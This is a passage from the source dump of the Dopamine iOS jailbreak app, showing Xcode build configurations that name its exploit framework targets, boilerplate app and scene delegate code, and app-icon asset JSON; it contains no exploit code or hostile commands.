				VERSIONING_SYSTEM = "apple-generic";
				VERSION_INFO_PREFIX = "";
			};
			name = Debug;
		};
		8C5FA8EE2BDD36BF008C246F /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEFINES_MODULE = YES;
				DEVELOPMENT_TEAM = 3Z56NQJ65R;
				DYLIB_COMPATIBILITY_VERSION = 1;
				DYLIB_CURRENT_VERSION = 1;
				DYLIB_INSTALL_NAME_BASE = "@rpath";
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = "$(SRCROOT)/Dopamine/Exploits/multicast_bytecopy/Info.plist";
				INFOPLIST_KEY_CFBundleDisplayName = multicast_bytecopy;
				INFOPLIST_KEY_NSHumanReadableCopyright = "";
				INSTALL_PATH = "$(LOCAL_LIBRARY_DIR)/Frameworks";
				IPHONEOS_DEPLOYMENT_TARGET = 15.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				MODULE_VERIFIER_SUPPORTED_LANGUAGES = "objective-c objective-c++";
				MODULE_VERIFIER_SUPPORTED_LANGUAGE_STANDARDS = "gnu17 gnu++20";
				PRODUCT_BUNDLE_IDENTIFIER = "com.opa334.multicast-bytecopy";
				PRODUCT_NAME = "$(TARGET_NAME:c99extidentifier)";
				SKIP_INSTALL = YES;
				SWIFT_EMIT_LOC_STRINGS = YES;
				TARGETED_DEVICE_FAMILY = "1,2";
				VERSIONING_SYSTEM = "apple-generic";
				VERSION_INFO_PREFIX = "";
			};
			name = Release;
		};
		8C71982C2ABF0E84003C6658 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				FRAMEWORK_SEARCH_PATHS = "$(SRCROOT)/../../Exploits";
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				HEADER_SEARCH_PATHS = "$(SRCROOT)/../BaseBin/.include";
				IPHONEOS_DEPLOYMENT_TARGET = 15.0;
				LIBRARY_SEARCH_PATHS = (
					"$(SRCROOT)/../BaseBin/.build",
					"$(SRCROOT)/Dopamine/Dependencies",
				);
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
			};
			name = Debug;
		};
		8C71982D2ABF0E84003C6658 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				FRAMEWORK_SEARCH_PATHS = "$(SRCROOT)/../../Exploits";
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				HEADER_SEARCH_PATHS = "$(SRCROOT)/../BaseBin/.include";
				IPHONEOS_DEPLOYMENT_TARGET = 15.0;
				LIBRARY_SEARCH_PATHS = (
					"$(SRCROOT)/../BaseBin/.build",
					"$(SRCROOT)/Dopamine/Dependencies",
				);
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		8C71982F2ABF0E84003C6658 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_ALTERNATE_APPICON_NAMES = "AppIcon_ElleKit AppIcon_Red AppIcon_Purple AppIcon_Blue";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 3Z56NQJ65R;
				FRAMEWORK_SEARCH_PATHS = (
					"$(inherited)",
					"$(PROJECT_DIR)/Frameworks",
				);
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = Dopamine/Info.plist;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				IPHONEOS_DEPLOYMENT_TARGET = 15.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				LIBRARY_SEARCH_PATHS = (
					"$(inherited)",
					"$(PROJECT_DIR)/Dopamine/Dependencies",
					"$(PROJECT_DIR)/Dopamine/Resources",
				);
				MARKETING_VERSION = 2.4.7;
				PRODUCT_BUNDLE_IDENTIFIER = com.opa334.Dopamine;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		8C7198302ABF0E84003C6658 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_ALTERNATE_APPICON_NAMES = "AppIcon_ElleKit AppIcon_Red AppIcon_Purple AppIcon_Blue";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 3Z56NQJ65R;
				FRAMEWORK_SEARCH_PATHS = (
					"$(inherited)",
					"$(PROJECT_DIR)/Frameworks",
				);
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = Dopamine/Info.plist;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				IPHONEOS_DEPLOYMENT_TARGET = 15.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				LIBRARY_SEARCH_PATHS = (
					"$(inherited)",
					"$(PROJECT_DIR)/Dopamine/Dependencies",
					"$(PROJECT_DIR)/Dopamine/Resources",
				);
				MARKETING_VERSION = 2.4.7;
				PRODUCT_BUNDLE_IDENTIFIER = com.opa334.Dopamine;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
		8CDD07B02B4F619000A32B61 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEFINES_MODULE = YES;
				DEVELOPMENT_TEAM = 3Z56NQJ65R;
				DYLIB_COMPATIBILITY_VERSION = 1;
				DYLIB_CURRENT_VERSION = 1;
				DYLIB_INSTALL_NAME_BASE = "@rpath";
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = Dopamine/Exploits/kfd/Info.plist;
				INFOPLIST_KEY_CFBundleDisplayName = kfd;
				INFOPLIST_KEY_NSHumanReadableCopyright = "";
				INSTALL_PATH = "$(LOCAL_LIBRARY_DIR)/Frameworks";
				IPHONEOS_DEPLOYMENT_TARGET = 15.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				MODULE_VERIFIER_SUPPORTED_LANGUAGES = "objective-c objective-c++";
				MODULE_VERIFIER_SUPPORTED_LANGUAGE_STANDARDS = "gnu17 gnu++20";
				PRODUCT_BUNDLE_IDENTIFIER = com.opa334.kfd;
				PRODUCT_NAME = "$(TARGET_NAME:c99extidentifier)";
				SKIP_INSTALL = YES;
				SWIFT_EMIT_LOC_STRINGS = YES;
				TARGETED_DEVICE_FAMILY = "1,2";
				VERSIONING_SYSTEM = "apple-generic";
				VERSION_INFO_PREFIX = "";
			};
			name = Debug;
		};
		8CDD07B12B4F619000A32B61 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEFINES_MODULE = YES;
				DEVELOPMENT_TEAM = 3Z56NQJ65R;
				DYLIB_COMPATIBILITY_VERSION = 1;
				DYLIB_CURRENT_VERSION = 1;
				DYLIB_INSTALL_NAME_BASE = "@rpath";
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = Dopamine/Exploits/kfd/Info.plist;
				INFOPLIST_KEY_CFBundleDisplayName = kfd;
				INFOPLIST_KEY_NSHumanReadableCopyright = "";
				INSTALL_PATH = "$(LOCAL_LIBRARY_DIR)/Frameworks";
				IPHONEOS_DEPLOYMENT_TARGET = 15.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				MODULE_VERIFIER_SUPPORTED_LANGUAGES = "objective-c objective-c++";
				MODULE_VERIFIER_SUPPORTED_LANGUAGE_STANDARDS = "gnu17 gnu++20";
				PRODUCT_BUNDLE_IDENTIFIER = com.opa334.kfd;
				PRODUCT_NAME = "$(TARGET_NAME:c99extidentifier)";
				SKIP_INSTALL = YES;
				SWIFT_EMIT_LOC_STRINGS = YES;
				TARGETED_DEVICE_FAMILY = "1,2";
				VERSIONING_SYSTEM = "apple-generic";
				VERSION_INFO_PREFIX = "";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		8C05B00B2B63152C001A7CF3 /* Build configuration list for PBXNativeTarget "badRecovery" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				8C05B00C2B63152C001A7CF3 /* Debug */,
				8C05B00D2B63152C001A7CF3 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		8C2B1FE72B532374009BA166 /* Build configuration list for PBXNativeTarget "dmaFail" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				8C2B1FE82B532374009BA166 /* Debug */,
				8C2B1FE92B532374009BA166 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		8C5FA8DE2BDD36B6008C246F /* Build configuration list for PBXNativeTarget "weightBufs" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				8C5FA8DC2BDD36B6008C246F /* Debug */,
				8C5FA8DD2BDD36B6008C246F /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		8C5FA8EC2BDD36BF008C246F /* Build configuration list for PBXNativeTarget "multicast_bytecopy" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				8C5FA8ED2BDD36BF008C246F /* Debug */,
				8C5FA8EE2BDD36BF008C246F /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		8C7198102ABF0E82003C6658 /* Build configuration list for PBXProject "Dopamine" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				8C71982C2ABF0E84003C6658 /* Debug */,
				8C71982D2ABF0E84003C6658 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		8C71982E2ABF0E84003C6658 /* Build configuration list for PBXNativeTarget "Dopamine" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				8C71982F2ABF0E84003C6658 /* Debug */,
				8C7198302ABF0E84003C6658 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		8CDD07B22B4F619000A32B61 /* Build configuration list for PBXNativeTarget "kfd" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				8CDD07B02B4F619000A32B61 /* Debug */,
				8CDD07B12B4F619000A32B61 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

/* Begin XCRemoteSwiftPackageReference section */
		8C46D71C2B5887AC002899DB /* XCRemoteSwiftPackageReference "zstd" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/facebook/zstd.git";
			requirement = {
				branch = dev;
				kind = branch;
			};
		};
/* End XCRemoteSwiftPackageReference section */

/* Begin XCSwiftPackageProductDependency section */
		8C46D7242B588973002899DB /* libzstd */ = {
			isa = XCSwiftPackageProductDependency;
			package = 8C46D71C2B5887AC002899DB /* XCRemoteSwiftPackageReference "zstd" */;
			productName = libzstd;
		};
/* End XCSwiftPackageProductDependency section */
	};
	rootObject = 8C71980D2ABF0E82003C6658 /* Project object */;
}

```

`Application/Dopamine.xcodeproj/project.xcworkspace/contents.xcworkspacedata`:

```xcworkspacedata
<?xml version="1.0" encoding="UTF-8"?>
<Workspace
   version = "1.0">
   <FileRef
      location = "self:">
   </FileRef>
</Workspace>

```

`Application/Dopamine/App Delegates/DOAppDelegate.h`:

```h
//
//  AppDelegate.h
//  Dopamine
//
//  Created by Lars Fröder on 23.09.23.
//

#import <UIKit/UIKit.h>

@interface DOAppDelegate : UIResponder <UIApplicationDelegate>


@end


```

`Application/Dopamine/App Delegates/DOAppDelegate.m`:

```m
//
//  AppDelegate.m
//  Dopamine
//
//  Created by Lars Fröder on 23.09.23.
//

#import "DOAppDelegate.h"

@interface DOAppDelegate ()

@end

@implementation DOAppDelegate


- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    // Override point for customization after application launch.
    return YES;
}


#pragma mark - UISceneSession lifecycle


- (UISceneConfiguration *)application:(UIApplication *)application configurationForConnectingSceneSession:(UISceneSession *)connectingSceneSession options:(UISceneConnectionOptions *)options {
    // Called when a new scene session is being created.
    // Use this method to select a configuration to create the new scene with.
    return [[UISceneConfiguration alloc] initWithName:@"Default Configuration" sessionRole:connectingSceneSession.role];
}


- (void)application:(UIApplication *)application didDiscardSceneSessions:(NSSet<UISceneSession *> *)sceneSessions {
    // Called when the user discards a scene session.
    // If any sessions were discarded while the application was not running, this will be called shortly after application:didFinishLaunchingWithOptions.
    // Use this method to release any resources that were specific to the discarded scenes, as they will not return.
}

- (UIInterfaceOrientationMask)application:(UIApplication *)application supportedInterfaceOrientationsForWindow:(UIWindow *)window
{
    if (UI_USER_INTERFACE_IDIOM() == UIUserInterfaceIdiomPad)
        return UIInterfaceOrientationMaskAll;
    return UIInterfaceOrientationMaskPortrait;
}

@end

```

`Application/Dopamine/App Delegates/DOSceneDelegate.h`:

```h
//
//  SceneDelegate.h
//  Dopamine
//
//  Created by Lars Fröder on 23.09.23.
//

#import <UIKit/UIKit.h>

@interface DOSceneDelegate : UIResponder <UIWindowSceneDelegate>

@property (strong, nonatomic) UIWindow * window;

+ (void)relaunch;

@end


```

`Application/Dopamine/App Delegates/DOSceneDelegate.m`:

```m
//
//  SceneDelegate.m
//  Dopamine
//
//  Created by Lars Fröder on 23.09.23.
//

#import "DOSceneDelegate.h"
#import "DONavigationController.h"

@interface DOSceneDelegate ()

@end

@implementation DOSceneDelegate

- (void)scene:(UIScene *)scene willConnectToSession:(UISceneSession *)session options:(UISceneConnectionOptions *)connectionOptions {
    UIWindow *window = [[UIWindow alloc] initWithWindowScene:(UIWindowScene *)scene];
    window.rootViewController = [[DONavigationController alloc] init];
    [window makeKeyAndVisible];
    self.window = window;
}

+ (void)relaunch
{
    UIWindowScene *windowScene = (UIWindowScene *)[[[UIApplication sharedApplication] connectedScenes] anyObject];
    DOSceneDelegate *instance = (DOSceneDelegate *)windowScene.delegate;

    [UIView animateWithDuration:0.3 animations:^{
        instance.window.alpha = 0;
    } completion:^(BOOL finished) {
        UIWindow *window = [[UIWindow alloc] initWithWindowScene:(UIWindowScene *)instance.window.windowScene];
        window.rootViewController = [[DONavigationController alloc] init];
        [window makeKeyAndVisible];
        instance.window = window;
        instance.window.alpha = 0;
        [UIView animateWithDuration:0.3 animations:^{
            instance.window.alpha = 1;
        }];
    }];
}

- (void)sceneDidDisconnect:(UIScene *)scene {
    // Called as the scene is being released by the system.
    // This occurs shortly after the scene enters the background, or when its session is discarded.
    // Release any resources associated with this scene that can be re-created the next time the scene connects.
    // The scene may re-connect later, as its session was not necessarily discarded (see `application:didDiscardSceneSessions` instead).
}


- (void)sceneDidBecomeActive:(UIScene *)scene {
    // Called when the scene has moved from an inactive state to an active state.
    // Use this method to restart any tasks that were paused (or not yet started) when the scene was inactive.
}


- (void)sceneWillResignActive:(UIScene *)scene {
    // Called when the scene will move from an active state to an inactive state.
    // This may occur due to temporary interruptions (ex. an incoming phone call).
}


- (void)sceneWillEnterForeground:(UIScene *)scene {
    // Called as the scene transitions from the background to the foreground.
    // Use this method to undo the changes made on entering the background.
}


- (void)sceneDidEnterBackground:(UIScene *)scene {
    // Called as the scene transitions from the foreground to the background.
    // Use this method to save data, release shared resources, and store enough scene-specific state information
    // to restore the scene back to its current state.
}


@end

```

`Application/Dopamine/Assets.xcassets/AccentColor.colorset/Contents.json`:

```json
{
  "colors" : [
    {
      "idiom" : "universal"
    }
  ],
  "info" : {
    "author" : "xcode",
    "version" : 1
  }
}

```

`Application/Dopamine/Assets.xcassets/AppIcon.appiconset/Contents.json`:

```json
{
  "images" : [
    {
      "filename" : "Icon-Notification@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "20x20"
    },
    {
      "filename" : "Icon-Notification@3x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "3x",
      "size" : "20x20"
    },
    {
      "filename" : "Icon-Small@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "29x29"
    },
    {
      "filename" : "Icon-Small@3x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "3x",
      "size" : "29x29"
    },
    {
      "filename" : "Icon-38@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "38x38"
    },
    {
      "filename" : "Icon-38@3x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "3x",
      "size" : "38x38"
    },
    {
      "filename" : "Icon-Small-40@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "40x40"
    },
    {
      "filename" : "Icon-Small-40@3x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "3x",
      "size" : "40x40"
    },
    {
      "filename" : "Icon-Small-40@3x 1.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "60x60"
    },
    {
      "filename" : "Icon-60@3x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "3x",
      "size" : "60x60"
    },
    {
      "filename" : "Icon-64@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "64x64"
    },
    {
      "filename" : "Icon-64@3x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "3x",
      "size" : "64x64"
    },
    {
      "filename" : "Icon-68@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "68x68"
    },
    {
      "filename" : "Icon-76@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "76x76"
    },
    {
      "filename" : "Icon-83.5@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "83.5x83.5"
    },
    {
      "idiom" : "universal",
      "platform" : "ios",
      "size" : "1024x1024"
    }
  ],
  "info" : {
    "author" : "xcode",
    "version" : 1
  }
}

```

`Application/Dopamine/Assets.xcassets/AppIcon_Blue.appiconset/Contents.json`:

```json
{
  "images" : [
    {
      "filename" : "Icon-Notification@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "20x20"
    },
    {
      "filename" : "Icon-Notification@3x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "3x",
      "size" : "20x20"
    },
    {
      "filename" : "Icon-Small@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "29x29"
    },
    {
      "filename" : "Icon-Small@3x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "3x",
      "size" : "29x29"
    },
    {
      "filename" : "Icon-38@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "38x38"
    },
    {
      "filename" : "Icon-38@3x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "3x",
      "size" : "38x38"
    },
    {
      "filename" : "Icon-Small-40@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "40x40"
    },
    {
      "filename" : "Icon-Small-40@3x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "3x",
      "size" : "40x40"
    },
    {
      "filename" : "Icon-60@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "60x60"
    },
    {
      "filename" : "Icon-60@3x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "3x",
      "size" : "60x60"
    },
    {
      "filename" : "Icon-64@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "64x64"
    },
    {
      "filename" : "Icon-64@3x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "3x",
      "size" : "64x64"
    },
    {
      "filename" : "Icon-68@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "68x68"
    },
    {
      "filename" : "Icon-76@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "76x76"
    },
    {
      "filename" : "Icon-83.5@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "83.5x83.5"
    },
    {
      "idiom" : "universal",
      "platform" : "ios",
      "size" : "1024x1024"
    }
  ],
  "info" : {
    "author" : "xcode",
    "version" : 1
  }
}

```

`Application/Dopamine/Assets.xcassets/AppIcon_ElleKit.appiconset/Contents.json`:

```json
{
  "images" : [
    {
      "filename" : "Icon-Notification@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "20x20"
    },
    {
      "filename" : "Icon-Notification@3x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "3x",
      "size" : "20x20"
    },
    {
      "filename" : "Icon-Small@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "29x29"
    },
    {
      "filename" : "Icon-Small@3x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "3x",
      "size" : "29x29"
    },
    {
      "filename" : "Icon-38@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "38x38"
    },
    {
      "filename" : "Icon-38@3x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "3x",
      "size" : "38x38"
    },
    {
      "filename" : "Icon-Small-40@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "40x40"
    },
    {
      "filename" : "Icon-Small-40@3x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "3x",
      "size" : "40x40"
    },
    {
      "filename" : "Icon-60@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "60x60"
    },
    {
      "filename" : "Icon-60@3x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "3x",
      "size" : "60x60"
    },
    {
      "filename" : "Icon-64@2x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "2x",
      "size" : "64x64"
    },
    {
      "filename" : "Icon-64@3x.png",
      "idiom" : "universal",
      "platform" : "ios",
      "scale" : "3x",
      "size" : "64x64"
    },
    {
